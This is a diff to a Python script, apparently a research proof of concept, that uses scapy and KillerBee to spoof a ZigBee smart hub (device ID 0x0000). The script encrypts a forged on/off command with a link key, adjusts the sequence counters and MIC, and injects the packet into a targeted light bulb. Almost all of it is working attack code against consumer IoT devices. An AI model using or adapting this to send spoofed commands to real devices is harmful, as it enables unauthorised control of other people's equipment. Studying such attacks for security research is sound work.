@@ -11,6 +11,7 @@ __author__ = 'Soteria'
 # 6. Encrypt the data with the keyc1
 # 7. Inject!
 
+
 import logging
 log_killerbee = logging.getLogger('scapy.killerbee')
 
@@ -37,8 +38,8 @@ SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
 # FAULY_TARGET_DEVICE_ID = '0x055f' # old faulty light bulb to be hacked
 TARGET_DEVICE_ID = '0xf973' # light bulb to be hacked
 
-DEFAULT_ZIGBEE_APP_LAYER_COUNTER = 128
-DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM = 25
+DEFAULT_ZIGBEE_APP_LAYER_COUNTER = 187
+DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM = 127
 TURN_ON_COMMAND_CODE = '\x01'
 TURN_OFF_COMMAND_CODE = '\x00'
 
@@ -97,6 +98,11 @@ decrypted_command_packet_payload.payload.fields['load'] = packet_load[:1] + clus
 print "ZCL after fixing it: " + decrypted_command_packet_payload.payload.fields['load'].encode("hex")
 print ""
 
+# Update Application support layer seq num:
+next_zigbee_cluster_seq_num = DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM
+next_zigbee_app_layer_counter = DEFAULT_ZIGBEE_APP_LAYER_COUNTER
+decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_layer_counter
+
 ieee_seq_num = lastPacket.fields['seqnum']
 
 ieee_data_layer = lastPacket.payload
@@ -123,19 +129,17 @@ print ""
 next_ieee_seq_num = ieee_seq_num + 1
 next_zigbeeNWK_seq_num = zigbeeNWK_seq_num + 2
 next_zigbee_frame_counter = zigbee_frame_counter + 1
-next_zigbee_app_layer_counter = DEFAULT_ZIGBEE_APP_LAYER_COUNTER
-next_zigbee_cluster_seq_num = DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM
+
 
 
 # Update command packet sequence numbers:
 encrypted_command_packet.fields['seqnum'] = next_ieee_seq_num
-encrypted_command_packet.payload.fields['dest_panid'] = ieee_panID
+#encrypted_command_packet.payload.fields['dest_panid'] = ieee_panID
 encrypted_command_packet.getlayer(ZigbeeNWK).fields['seqnum'] = next_zigbeeNWK_seq_num
 encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigbee_frame_counter
 
 
-#hexdump(decrypted_packet.data)
-decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_layer_counter
+
 #decrypted_command_packet_payload.payload.payload.fields['seqnum'] = next_zigbee_cluster_seq_num
 # Encrypt packet
 encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 3)
@@ -143,7 +147,16 @@ encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypt
 # Manual edit of the final packet:
 # Adding the mic in the end plus remove the bytes after the encrypted payload:
 mic = encrypted_command_packet_to_inject.getlayer(ZigbeeSecurityHeader).fields['mic']
-hex_mic = hex(mic).split('x')[1]
+hex_mic = str(hex(mic))
+encrypted_command_packet_to_inject.getlayer(ZigbeeSecurityHeader).fields['mic'] = hex_mic
+
+import staticData
+staticData.MY_HEX_MIC = hex_mic
+
+#hex_mic = hex(mic).split('x')[1]
+#print "Hex Mic is " + str(hex_mic)
+#encrypted_command_packet_to_inject.getlayer(ZigbeeSecurityHeader).fields['mic'] = str(hex_mic)
+
 #final_packet = encrypted_command_packet_to_inject[:-10] + hex_mic
 print ""
 print "Final packet to inject:"
@@ -151,4 +164,4 @@ encrypted_command_packet_to_inject.show()
 
 # Send encrypted command
 #kbsendp(pkt, channel = None, inter = 0, loop = 0, iface = None, count = None, verbose = None, realtime=None):
-kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 5, verbose = 3)
+kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 1, verbose = 3)
